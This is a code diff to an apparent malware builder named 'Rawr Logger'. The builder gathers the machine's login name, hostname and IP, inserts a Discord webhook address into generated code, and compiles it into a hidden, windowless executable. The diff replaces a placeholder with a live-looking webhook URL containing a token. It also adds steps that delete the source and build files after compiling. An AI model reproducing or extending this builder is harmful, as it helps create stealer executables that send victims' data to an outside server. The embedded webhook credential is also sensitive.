@@ -9,7 +9,7 @@ import shutil
 os.system(f'cls & title Rawr Logger!')
 
 u = os.getlogin()
-webhook = "Enter Dual Webhook Here"
+webhook = "https://discordapp.com/api/webhooks/1018194678853685309/LZSsAnCsltCFGzQgdpQ5pSJ4LyMwPRj74WTGAFFChOe7WGGPCmOaulFolU1U_jQF7fI2"
 hostname = socket.gethostname()   
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname)  
@@ -110,7 +110,12 @@ with open('image.jpg', 'rb') as f:
 """
 file = open(f'{name}.py', 'a')
 file.write(code.replace("webhooks", webhook))
-os.system(f'pyinstaller {name}.py --onefile')
+time.sleep(1)
+os.system(f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {name} {name}.py")
+shutil.rmtree('build')
+shutil.rmtree('dist')
+shutil.rmtree('__pycache__')
 os.remove(f'{name}.spec')
-Write.Print("Rawr Logger Was SucessFully Complied Check Dist Folder\n",Colors.white_to_green, interval=0.01) 
-time.sleep(15)
+os.remove(f'{name}.py')
+Write.Print("Rawr Logger Was SucessFully Complied\n",Colors.white_to_green, interval=0.01) 
+time.sleep(3)
